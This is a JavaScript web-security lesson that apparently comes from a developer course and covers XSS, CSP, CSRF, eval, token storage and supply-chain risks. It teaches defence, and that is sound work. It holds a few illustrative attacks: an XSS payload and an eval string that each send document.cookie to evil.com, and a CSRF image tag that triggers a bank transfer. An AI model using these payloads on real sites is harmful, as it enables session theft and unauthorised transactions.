Security in JavaScript

Security is not optional — seniors protect users by default.

Primary Source for this lesson Read this after the lesson: OWASP — DOM-based XSS Prevention Cheat Sheet. OWASP is the global authority on web security. Bookmark it and return often.
Mindset First Security is not a feature you add at the end. It is a default posture. Every time you insert user-provided data somewhere, your first question should be: "what could an attacker do with this?" This lesson gives you the vocabulary and patterns to answer that question.

1. XSS — Cross-Site Scripting

XSS is the most common web vulnerability. An attacker tricks your application into rendering malicious JavaScript in another user's browser. Once that script runs, the attacker effectively controls the page for that user.

Three Types of XSS

TypeHow It WorksExample
ReflectedMalicious input in URL is immediately reflected in the responseSearch result page renders the query param without escaping
StoredMalicious input saved to DB, served to all users laterA comment containing <script> that every visitor loads
DOM-basedClient-side JS reads attacker-controlled data and writes it to the DOMReading location.hash and setting innerHTML

A Vulnerable DOM-based XSS Example

// VULNERABLE: reading user-controlled input and writing to innerHTML
const query = new URLSearchParams(window.location.search).get("name");
document.getElementById("greeting").innerHTML = `Hello, ${query}!`;

// Attack URL:
// https://yoursite.com/?name=<img src=x onerror="fetch('evil.com/?c='+document.cookie)">
// Result: attacker steals the user's cookies

Real impact of XSS: steal cookies and session tokens, exfiltrate localStorage, redirect users to phishing pages, log keystrokes, make requests on the user's behalf.

2. Preventing XSS

The rule is simple: never put user-provided data directly into HTML. Here is the complete prevention toolkit:

// UNSAFE — innerHTML interprets HTML tags
element.innerHTML = userInput;

// SAFE — textContent treats everything as plain text
element.textContent = userInput;

// SAFE — createElement and append
const p = document.createElement("p");
p.textContent = userInput;
container.appendChild(p);
The innerHTML Rule If you must use innerHTML with dynamic content, you MUST sanitize it first. Use the DOMPurify library — do not write your own sanitizer. Sanitization is notoriously difficult to get right. 
// If you MUST render HTML from user input, use DOMPurify:
import DOMPurify from "dompurify";

const clean = DOMPurify.sanitize(userHtmlInput);
element.innerHTML = clean; // safe — malicious tags stripped

// Also avoid these with user input:
eval(userInput);              // executes arbitrary code
new Function(userInput);      // same as eval
setTimeout(userInput, 0);    // string form runs eval
setInterval(userInput, 100); // same

3. Content Security Policy (CSP)

CSP is an HTTP response header that tells the browser which sources of content are legitimate. Even if an attacker manages to inject a script tag, CSP can prevent it from executing.

# Strong CSP header (set on the server):
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{random}';
  style-src 'self';
  img-src 'self' data:;
  connect-src 'self' https://api.yoursite.com;
DirectiveControlsValue Example
default-srcFallback for all resource types'self' — same origin only
script-srcJavaScript sources'self' https://cdn.example.com
style-srcCSS sources'self' 'unsafe-inline'
'nonce-xyz'Allow specific inline scriptsScript tag must have matching nonce attribute
'none'Block everything for this typeobject-src 'none' — no plugins
CSP Blocks Inline Scripts by Default When CSP is enabled, inline <script>...</script> blocks are blocked unless you explicitly allow them with 'unsafe-inline' (don't) or a nonce. This is intentional — it means even if an attacker injects a script tag, the browser won't run it.

4. CSRF — Cross-Site Request Forgery

CSRF is a different attack vector. Instead of injecting code, the attacker tricks a victim's browser into sending an authenticated request to your server.

It works because browsers automatically attach cookies to requests — including to sites the user is logged into. A malicious page on evil.com can cause the browser to send a request to yourbank.com, and the bank's server sees it as legitimate because the session cookie is attached.

<!-- Malicious page at evil.com -->
<img src="https://yourbank.com/transfer?to=attacker&amount=5000" />
<!-- The browser fetches this URL with the user's bank cookies -->
<!-- If the bank doesn't check CSRF tokens, the transfer goes through -->

CSRF Mitigations

MitigationHow It Works
CSRF TokensServer includes a secret token in each form. On submit, token is checked. Attacker can't know the token.
SameSite CookieSet-Cookie: session=abc; SameSite=Strict — browser won't send cookie in cross-site requests
Check Origin/RefererServer verifies the request came from the expected origin
Custom Request HeadersAPIs that require headers (like X-Requested-With) can't be triggered by simple cross-site forms
localStorage vs Cookies for CSRF localStorage data is NOT automatically sent with requests — so tokens in localStorage are safe from CSRF. However, localStorage IS accessible to JavaScript — so it is vulnerable to XSS. Properly configured HttpOnly cookies are safer for session tokens, but need CSRF protection. There is no magic answer: you must protect against both.

5. eval() and Dynamic Code Execution

eval() takes a string and executes it as JavaScript code. This seems powerful, but it is almost always a severe security hole when combined with user-controlled input.

// NEVER do this:
const userInput = 'fetch("https://evil.com/?data=" + document.cookie)';
eval(userInput); // Runs the attacker's code with full page privileges

// NEVER do this either (all equivalent to eval):
new Function(userInput)();
setTimeout(userInput, 0);   // string form
setInterval(userInput, 0);  // string form

// SAFE: pass function references, not strings
setTimeout(() => doSomething(), 1000);  // fine
setTimeout(doSomething, 1000);         // fine
eval() is Also Slow Beyond security, eval() prevents the JS engine from optimizing the code. The V8 JIT compiler can't optimize code it hasn't seen yet. Avoid eval() for both security and performance reasons.

6. Sensitive Data Handling

Where you store sensitive data determines how it can be stolen.

StorageXSS accessible?CSRF risk?Best for
localStorageYes — any JS can read itNo — not auto-sentNon-sensitive user preferences
sessionStorageYesNoTemporary state, not tokens
Cookie (no flags)YesYesNothing sensitive
Cookie (HttpOnly)No — JS cannot read itYesSession tokens (with CSRF protection)
Cookie (HttpOnly + SameSite=Strict + Secure)NoNoSession tokens — gold standard
 
// What NOT to do — tokens in localStorage are XSS targets:
localStorage.setItem("authToken", token);

// What to do — set HttpOnly cookies server-side:
// Set-Cookie: authToken=abc123; HttpOnly; Secure; SameSite=Strict; Path=/
// The browser sends this cookie automatically, but JS cannot read document.cookie to get it

// Never log sensitive data:
console.log("User token:", authToken); // visible in DevTools, log aggregators

7. Third-Party Script Risks

Every npm package and external script you load is an extension of trust. A compromised package has full access to your application.

Subresource Integrity (SRI)

<!-- Without SRI: if the CDN is compromised, attacker code runs -->
<script src="https://cdn.example.com/library.js"></script>

<!-- With SRI: browser verifies hash before executing -->
<script
  src="https://cdn.example.com/library.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous"
></script>

npm Security Practices

  • Run npm audit regularly — it checks for known vulnerabilities in your dependency tree.
  • Use package-lock.json and commit it — locks exact versions, prevents surprise updates.
  • Prefer packages with many weekly downloads and recent maintenance.
  • Be suspicious of packages that request unusual permissions or have very new publication dates.
  • Consider npm audit fix — but review the changes before applying.
Supply Chain Attacks are Real In 2021, the ua-parser-js package (millions of weekly downloads) was hijacked and published malware. In 2022, node-ipc was intentionally sabotaged. Treat every dependency as a potential attack surface.
